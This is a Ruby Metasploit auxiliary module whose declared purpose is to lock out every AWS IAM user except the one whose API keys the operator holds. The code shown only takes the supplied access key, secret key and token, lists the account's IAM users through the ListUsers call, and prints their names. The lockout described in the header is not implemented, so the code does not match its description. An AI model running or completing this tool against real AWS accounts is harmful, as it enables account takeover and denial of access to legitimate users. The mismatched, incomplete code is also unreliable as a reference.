##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'metasploit/framework/aws/client'

class MetasploitModule < Msf::Auxiliary

  include Metasploit::Framework::Aws::Client

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => "Locks out all AWS IAM User except you",
        'Description'    => %q{
          This module will attempt to lock out all AWS (Amazon Web Services) IAM
          (Identity and Access Management) users except the user who's API keys you have.
        },
        'License'        => MSF_LICENSE,
        'Author'         => [
          'Javier Godinez <godinezj[at]gmail.com>'
        ]
      )
    )

    register_options(
      [
        OptString.new('AccessKeyId', [true, 'AWS access key', '']),
        OptString.new('SecretAccessKey', [true, 'AWS secret key', '']),
        OptString.new('Token', [false, 'AWS session token', ''])
      ]
    )
    register_advanced_options(
      [
        OptString.new('RHOST', [true, 'AWS IAM Endpoint', 'iam.amazonaws.com']),
        OptString.new('RPORT', [true, 'AWS IAM Endpoint TCP Port', 443]),
        OptString.new('SSL', [true, 'AWS IAM Endpoint SSL', true]),
        OptString.new('Region', [true, 'The default region', 'us-east-1' ])
      ]
    )
    deregister_options('VHOST')
  end

  def run
    # setup creds for making IAM API calls
    creds = {
      'AccessKeyId' => datastore['AccessKeyId'],
      'SecretAccessKey' => datastore['SecretAccessKey']
    }
    creds['Token'] = datastore['Token'] unless datastore['Token'].blank?

    results = {}

    # get users
    print_status("Listing users")
    action = 'ListUsers'
    doc = call_iam(creds, 'Action' => action)
    doc = print_results(doc, action)
    if doc && doc['member']
      p doc['member'].map {|u| u['UserName']}
    end
  end
end
